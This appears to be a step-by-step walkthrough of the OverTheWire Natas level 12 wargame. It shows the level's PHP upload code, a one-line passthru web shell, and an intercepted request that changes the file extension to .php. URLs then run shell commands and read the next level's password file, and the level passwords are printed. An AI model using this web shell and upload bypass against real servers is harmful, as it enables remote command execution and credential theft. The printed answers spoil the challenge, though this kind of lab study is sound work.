@@ -1,0 +1,194 @@
+PASSWORD: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+
+*LEFT CLICK* View sourcecode
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas12</h1>
+<div id="content">
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  <-----FILE SIZE HAS TO BE LESS THEN 1KB 
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />1KB
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+*OPEN Text Editor / MOUSEPAD*
+
+<?php passthru($_GET['ra6narok']); ?>
+
+*SAVE FILE AS NATAS12.PHP or WHATEVER.PHP
+
+*BURP SUITE*
+TOGGLE Intercept is on
+
+URL: http://natas12.natas.labs.overthewire.org/
+Choose a JPEG to upload (max 1KB):
+BROWSE
+UPLOAD
+
+*BROWSE TO NATAS12.PHP or WHATEVER.PHP
+*UPLOAD
+
+*BURP SUITE*
+POST /index.php HTTP/1.1
+
+Host: natas12.natas.labs.overthewire.org
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Content-Type: multipart/form-data; boundary=---------------------------371145944813030848792425645121
+
+Content-Length: 527
+
+Origin: http://natas12.natas.labs.overthewire.org
+
+Authorization: Basic bmF0YXMxMjpZV3FvMHBqcGNYelNJbDVOTUFWeGcxMlF4ZUMxdzlRRw==
+
+Connection: close
+
+Referer: http://natas12.natas.labs.overthewire.org/
+
+Upgrade-Insecure-Requests: 1
+
+
+
+-----------------------------371145944813030848792425645121
+
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+
+
+1000
+
+-----------------------------371145944813030848792425645121
+
+Content-Disposition: form-data; name="filename"
+
+
+
+6jjzzh1nvm.php  <-----*CHANGE jpg to php
+
+-----------------------------371145944813030848792425645121
+
+Content-Disposition: form-data; name="uploadedfile"; filename="Natas12.php"
+
+Content-Type: application/x-php
+
+
+
+<?php passthru($_GET['ra6narok']); ?>
+
+
+-----------------------------371145944813030848792425645121--
+
+*TOGGLE FORWARD / SEND*
+*TOGGLE Intercept is off
+
+URL: http://natas12.natas.labs.overthewire.org/index.php
+The file upload/jykmkl0cgo.php has been uploaded
+
+*RIGHT CLICK FILE AND OPEN NEW TAB*
+
+URL: http://natas12.natas.labs.overthewire.org/upload/jykmkl0cgo.php
+Notice: Undefined index: ra6narok in /var/www/natas/natas12/upload/jykmkl0cgo.php on line 1
+
+Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/upload/jykmkl0cgo.php on line 1
+
+*WE CAN TEST A SIMPLE UNAME -R INJECTION WIT THIS URL*
+URL: http://natas12.natas.labs.overthewire.org/upload/jykmkl0cgo.php?ra6narok=uname%20-r
+
+6.2.0-1012-aws 
+
+*WHICH MEANS THE SHELL COMMAND HAS PASSED THROUGH TO THE LINUX SHELL WITH RETURNED RESULTS. SO WE JUST NEED TO cat /etc/natas_webpass/natas13 WITH THIS URL*
+URL: http://natas12.natas.labs.overthewire.org/upload/jykmkl0cgo.php?ra6narok=cat%20/etc/natas_webpass/natas13
+
+lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9   <-----PASSWORD
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
